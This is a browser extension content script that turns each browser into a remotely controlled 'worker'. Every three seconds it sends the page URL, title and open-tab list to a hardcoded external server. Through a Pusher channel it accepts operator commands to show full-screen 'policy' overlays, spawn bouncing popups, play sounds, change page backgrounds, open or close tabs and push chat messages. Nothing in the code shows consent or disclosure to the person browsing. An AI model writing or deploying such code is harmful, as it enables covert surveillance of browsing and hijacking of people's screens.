(async function() {
    'use strict';

    if (window.self !== window.top) return;

    const PUSHER_KEY = 'ccc021de100d33e2beb3';
    const PUSHER_CLUSTER = 'us2';
    const SERVER_URL = 'https://remote-server-t2dh.onrender.com';

    async function getWorkerId() {
        return new Promise((resolve) => {
            if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
                chrome.storage.local.get(['worker_id'], (result) => {
                    if (result && result.worker_id) {
                        resolve(result.worker_id);
                    } else {
                        const newWorkerId = 'WORKER-' + Math.random().toString(36).substring(2, 8).toUpperCase();
                        chrome.storage.local.set({ worker_id: newWorkerId }, () => resolve(newWorkerId));
                    }
                });
            } else {
                let localWorker = localStorage.getItem('agent_worker_id');
                if (!localWorker) {
                    localWorker = 'WORKER-' + Math.random().toString(36).substring(2, 8).toUpperCase();
                    localStorage.setItem('agent_worker_id', localWorker);
                }
                resolve(localWorker);
            }
        });
    }

    const workerId = await getWorkerId();
    let myTabId = null;

    function fetchTabInfo() {
        return new Promise((resolve) => {
            if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                chrome.runtime.sendMessage({ action: 'GET_TAB_INFO' }, (response) => {
                    if (chrome.runtime.lastError || !response) {
                        resolve({ myTabId: null, tabs: [] });
                    } else {
                        if (response.myTabId) {
                            myTabId = response.myTabId;
                        }
                        resolve(response);
                    }
                });
            } else {
                resolve({ myTabId: null, tabs: [] });
            }
        });
    }

    function isImageUrl(url) {
        return typeof url === 'string' && (url.match(/\.(jpeg|jpg|gif|png|webp)$/i) != null || url.startsWith('data:image/'));
    }

    function playAudio(audioUrl) {
        if (!audioUrl) return;
        
        const audio = new Audio(audioUrl);
        audio.volume = 1.0;
        
        const promise = audio.play();
        if (promise !== undefined) {
            promise.catch(error => {
                console.warn('[Worker] Direct play blocked. Retrying via hidden audio element:', error);
                
                const audioEl = document.createElement('audio');
                audioEl.src = audioUrl;
                audioEl.autoplay = true;
                audioEl.style.display = 'none';
                (document.body || document.documentElement).appendChild(audioEl);
                
                audioEl.play().catch(e => {
                    console.error('[Worker] Sound blocked by browser policy.', e);
                });
            });
        }
    }

    function createFullScreenAlert(title, message, imageUrl) {
        const existing = document.getElementById('fullscreen-agent-alert');
        if (existing) existing.remove();

        const overlay = document.createElement('div');
        overlay.id = 'fullscreen-agent-alert';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(18, 18, 20, 0.95);
            z-index: 9999999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #ffffff;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        `;

        const card = document.createElement('div');
        card.style.cssText = `
            background: #1a1a1e;
            border: 2px solid #ff4444;
            border-radius: 12px;
            padding: 32px;
            max-width: 500px;
            width: 90%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
        `;

        const alertTitle = document.createElement('h1');
        alertTitle.style.cssText = 'color: #ff4444; font-size: 1.8rem; margin-bottom: 16px;';
        alertTitle.textContent = title || '⚠️ Policy Notification';
        card.appendChild(alertTitle);

        if (imageUrl) {
            const img = document.createElement('img');
            img.src = imageUrl;
            img.style.cssText = 'max-width: 100%; max-height: 200px; object-fit: contain; border-radius: 6px; margin-bottom: 16px;';
            card.appendChild(img);
        }

        const alertBody = document.createElement('p');
        alertBody.style.cssText = 'color: #e1e1e6; font-size: 1.1rem; line-height: 1.5; margin: 0;';
        alertBody.textContent = message || 'Please review administrative guidelines before continuing.';
        card.appendChild(alertBody);

        overlay.appendChild(card);
        (document.body || document.documentElement).appendChild(overlay);
    }

    let chatBoxContainer = null;
    let chatMessagesArea = null;
    let chatHeaderTitle = null;

    function createChatUI() {
        if (chatBoxContainer) return;

        chatBoxContainer = document.createElement('div');
        chatBoxContainer.id = 'agent-chat-overlay';
        chatBoxContainer.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 320px;
            height: 380px;
            background-color: #1a1a1e;
            border: 1px solid #0066ff;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.5);
            z-index: 999999;
            display: none;
            flex-direction: column;
            font-family: sans-serif;
            color: #fff;
            overflow: hidden;
        `;

        const header = document.createElement('div');
        header.style.cssText = `
            background-color: #0066ff;
            padding: 10px;
            font-weight: bold;
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        `;

        chatHeaderTitle = document.createElement('span');
        chatHeaderTitle.textContent = 'Admin Support Chat';
        header.appendChild(chatHeaderTitle);

        chatMessagesArea = document.createElement('div');
        chatMessagesArea.style.cssText = `
            flex: 1;
            padding: 10px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 8px;
            font-size: 13px;
            background-color: #121214;
        `;

        const inputContainer = document.createElement('div');
        inputContainer.style.cssText = `
            padding: 8px;
            background-color: #1a1a1e;
            display: flex;
            gap: 6px;
            border-top: 1px solid #333;
        `;

        const chatInput = document.createElement('input');
        chatInput.type = 'text';
        chatInput.placeholder = 'Type text or Image URL...';
        chatInput.style.cssText = `
            flex: 1;
            padding: 8px;
            border-radius: 4px;
            border: 1px solid #444;
            background: #222;
            color: #fff;
            outline: none;
            font-size: 12px;
        `;

        const sendBtn = document.createElement('button');
        sendBtn.textContent = 'Send';
        sendBtn.style.cssText = `
            padding: 8px 12px;
            background: #0066ff;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            font-size: 12px;
        `;

        async function sendReply() {
            const text = chatInput.value.trim();
            if (!text) return;

            appendChatMessage('You', text, '#00ff88');
            chatInput.value = '';

            try {
                await fetch(`${SERVER_URL}/worker-chat-message`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        workerId: workerId,
                        text: text,
                        timestamp: new Date().toLocaleTimeString()
                    })
                });
            } catch (e) {
                console.error('[Worker] Failed to send chat message:', e);
            }
        }

        sendBtn.onclick = sendReply;
        chatInput.onkeydown = (e) => { if (e.key === 'Enter') sendReply(); };

        inputContainer.appendChild(chatInput);
        inputContainer.appendChild(sendBtn);
        chatBoxContainer.appendChild(header);
        chatBoxContainer.appendChild(chatMessagesArea);
        chatBoxContainer.appendChild(inputContainer);

        (document.body || document.documentElement).appendChild(chatBoxContainer);
    }

    function appendChatMessage(sender, text, color = '#fff') {
        if (!chatMessagesArea) createChatUI();
        const msg = document.createElement('div');
        msg.style.cssText = `
            background: #222;
            padding: 6px 10px;
            border-radius: 6px;
            border-left: 3px solid ${color};
            word-break: break-word;
        `;

        const senderTag = document.createElement('strong');
        senderTag.style.color = color;
        senderTag.textContent = sender + ': ';
        msg.appendChild(senderTag);

        if (isImageUrl(text)) {
            msg.appendChild(document.createElement('br'));
            const img = document.createElement('img');
            img.src = text;
            img.style.cssText = 'max-width: 100%; max-height: 150px; border-radius: 4px; margin-top: 4px; object-fit: contain;';
            msg.appendChild(img);
        } else {
            const textNode = document.createTextNode(text);
            msg.appendChild(textNode);
        }

        chatMessagesArea.appendChild(msg);
        chatMessagesArea.scrollTop = chatMessagesArea.scrollHeight;
    }

    if (document.readyState === 'complete') {
        createChatUI();
    } else {
        window.addEventListener('load', createChatUI);
    }

    function createBouncingPopup(imageUrl, soundUrl) {
        if (!document.getElementById('bouncing-popup-css')) {
            const style = document.createElement('style');
            style.id = 'bouncing-popup-css';
            style.textContent = `
                @keyframes bounceHorizontal {
                    0% { left: 2%; }
                    50% { left: 70%; }
                    100% { left: 2%; }
                }
                @keyframes bounceVertical {
                    0% { top: 2%; }
                    50% { top: 70%; }
                    100% { top: 2%; }
                }
            `;
            (document.head || document.documentElement).appendChild(style);
        }

        const durH = (3 + Math.random() * 2).toFixed(1) + 's';
        const durV = (2.5 + Math.random() * 2).toFixed(1) + 's';
        const delayH = '-' + (Math.random() * 3).toFixed(1) + 's';
        const delayV = '-' + (Math.random() * 3).toFixed(1) + 's';

        const popup = document.createElement('div');
        popup.className = 'bouncing-agent-popup';
        popup.style.cssText = `
            position: fixed;
            width: 250px;
            padding: 12px;
            background: #1a1a1e;
            border: 2px solid #0066ff;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
            z-index: 999999;
            text-align: center;
            animation: bounceHorizontal ${durH} infinite linear ${delayH}, bounceVertical ${durV} infinite linear ${delayV};
        `;

        if (imageUrl) {
            const img = document.createElement('img');
            img.src = imageUrl;
            img.style.cssText = 'width: 100%; max-height: 180px; object-fit: contain; border-radius: 4px;';
            popup.appendChild(img);
        }

        (document.body || document.documentElement).appendChild(popup);

        if (soundUrl) {
            playAudio(soundUrl);
        }
    }

    if (typeof Pusher === 'undefined') {
        console.error('[Worker] Pusher library is not loaded.');
    } else {
        const pusher = new Pusher(PUSHER_KEY, { cluster: PUSHER_CLUSTER });
        const commandChannel = pusher.subscribe(`channel-${workerId}`);

        commandChannel.bind('execute-command', function(data) {
            console.log('[Worker] Command received:', data);

            if (data.targetTabIds && Array.isArray(data.targetTabIds) && data.targetTabIds.length > 0) {
                if (myTabId && !data.targetTabIds.includes(myTabId)) {
                    return; 
                }
            }

            if (data.action === 'show-fullscreen-alert') {
                createFullScreenAlert(data.title, data.message, data.imageUrl);
            }

            if (data.action === 'close-alert') {
                const existing = document.getElementById('fullscreen-agent-alert');
                if (existing) existing.remove();
            }

            if (data.action === 'spawn-bouncing-popup') {
                createBouncingPopup(data.imageUrl, data.soundUrl);
            }

            if (data.action === 'update-chat-settings') {
                if (!chatBoxContainer) createChatUI();
                if (data.title && chatHeaderTitle) chatHeaderTitle.textContent = data.title;
            }

            if (data.action === 'toggle-chat') {
                if (!chatBoxContainer) createChatUI();
                if (data.title && chatHeaderTitle) chatHeaderTitle.textContent = data.title;
                chatBoxContainer.style.display = data.visible ? 'flex' : 'none';
            }

            if (data.action === 'admin-chat-message' && data.text) {
                if (!chatBoxContainer) createChatUI();
                if (data.title && chatHeaderTitle) chatHeaderTitle.textContent = data.title;
                chatBoxContainer.style.display = 'flex';

                const senderName = data.senderName || 'Admin';
                appendChatMessage(senderName, data.text, '#0066ff');
            }

            if (data.action === 'clear-chat') {
                if (chatMessagesArea) chatMessagesArea.textContent = '';
            }

            if (data.action === 'change-bg') {
                document.body.style.backgroundImage = 'none';
                document.body.style.backgroundColor = data.color || '#000';
            }

            if (data.action === 'change-bg-image' && data.imageUrl) {
                document.body.style.backgroundImage = `url("${data.imageUrl}")`;
                document.body.style.backgroundSize = 'cover';
                document.body.style.backgroundPosition = 'center';
                document.body.style.backgroundRepeat = 'no-repeat';
                document.body.style.backgroundAttachment = 'fixed';
            }

            if (data.action === 'play-sound' && data.audioUrl) {
                playAudio(data.audioUrl);
            }

            if (data.action === 'open-tab' && data.url) {
                if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage) {
                    chrome.runtime.sendMessage({ action: 'OPEN_TAB', url: data.url });
                } else {
                    window.open(data.url, '_blank');
                }
            }

            if (data.action === 'close-tab') {
                if (typeof chrome !== 'undefined' && chrome.runtime && chrome.runtime.sendMessage && myTabId) {
                    chrome.runtime.sendMessage({ action: 'CLOSE_TAB', tabId: myTabId });
                } else {
                    window.close();
                }
            }
        });
    }

    async function sendActivePing() {
        const info = await fetchTabInfo();
        let tabs = info.tabs || [];
        
        tabs = tabs.filter(t => t.url && !t.url.startsWith('chrome://'));
        if (tabs.length > 10) {
            tabs = tabs.slice(0, 10);
        }

        try {
            await fetch(`${SERVER_URL}/worker-active`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    workerId: workerId,
                    pageTitle: document.title || 'Untitled',
                    url: window.location.href,
                    timestamp: new Date().toISOString(),
                    openTabs: tabs.length > 0 ? tabs : [{ tabId: myTabId || 'TAB-MAIN', title: document.title, url: window.location.href }]
                })
            });
        } catch (e) {}
    }

    setInterval(sendActivePing, 3000);
    sendActivePing();
})();